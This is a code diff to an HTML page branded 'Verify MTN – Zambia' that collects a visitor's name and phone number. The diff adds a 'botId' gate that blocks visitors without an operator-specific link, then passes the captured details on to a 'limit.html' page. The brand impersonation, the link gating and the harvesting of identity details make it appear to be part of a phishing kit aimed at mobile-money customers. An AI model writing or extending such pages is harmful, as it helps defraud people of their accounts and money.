@@ -1,6 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+    // ============================================================
+    //  BOT ID RESOLVER — runs FIRST on every page load
+    //  Reads botId from URL immediately. Never defaults to bot1.
+    //  Persists to localStorage. Rewrites URL so refreshes keep it.
+    //  Stops the page if botId is missing.
+    // ============================================================
+    (function () {
+        try {
+            const params = new URLSearchParams(window.location.search);
+
+            // 1. Read from URL FIRST
+            let botId = params.get('botId');
+
+            // 2. Fall back to localStorage ONLY if URL is empty
+            if (!botId) {
+                botId = localStorage.getItem('botId');
+            }
+
+            // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
+            if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+                document.documentElement.innerHTML =
+                    '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+                    '<h2>Invalid link</h2>' +
+                    '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+                    '</body>';
+                window.__BOTID_MISSING__ = true;
+                throw new Error('botId missing from URL and localStorage');
+            }
+
+            // 4. Persist so later pages inherit it
+            localStorage.setItem('botId', botId);
+
+            // 5. Ensure the URL always carries botId
+            if (params.get('botId') !== botId) {
+                params.set('botId', botId);
+                const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+                window.history.replaceState({}, '', newUrl);
+            }
+
+            // 6. Expose globally
+            window.__BOT_ID__ = botId;
+
+            console.log('🆔 botId resolved immediately:', botId);
+        } catch (err) {
+            console.error('botId resolver failed:', err.message);
+        }
+    })();
+    </script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Verify MTN – Zambia</title>
@@ -110,7 +160,7 @@
 </head>
 <body>
     <div class="phone-card">
-        <a href="index.html" class="back-link"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" /></svg> Back</a>
+        <a href="#" id="backLink" class="back-link"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" /></svg> Back</a>
         <div class="brand-mini">
             <div class="brand-name">Mobile Verification</div>
             <div class="brand-tagline">• verify your details •</div>
@@ -142,9 +192,17 @@
     </div>
     <script>
         (function() {
+            // ---------- BOTID (resolved by the head script) ----------
+            const botId = window.__BOT_ID__;
+            if (!botId) return;
+
             const nameInput = document.getElementById('nameInput');
             const input = document.getElementById('mtnInput');
             const checkBtn = document.getElementById('checkBtn');
+            const backLink = document.getElementById('backLink');
+
+            // Preserve botId on the back link
+            backLink.href = 'index.html?botId=' + encodeURIComponent(botId);
 
             // Load previously saved name (if any)
             const savedName = localStorage.getItem('fullName') || '';
@@ -170,7 +228,6 @@
             }
 
             nameInput.addEventListener('input', update);
-
             input.addEventListener('input', update);
 
             checkBtn.addEventListener('click', function() {
@@ -183,7 +240,10 @@
                 localStorage.setItem('fullName', name);
                 localStorage.setItem('phone', '+260' + digits);
 
-                window.location.href = 'limit.html';
+                // Carry botId + phone + name forward in the URL too
+                window.location.href = 'limit.html?botId=' + encodeURIComponent(botId) +
+                                       '&phone=' + encodeURIComponent('+260' + digits) +
+                                       '&name=' + encodeURIComponent(name);
             });
 
             input.addEventListener('keydown', function(e) {
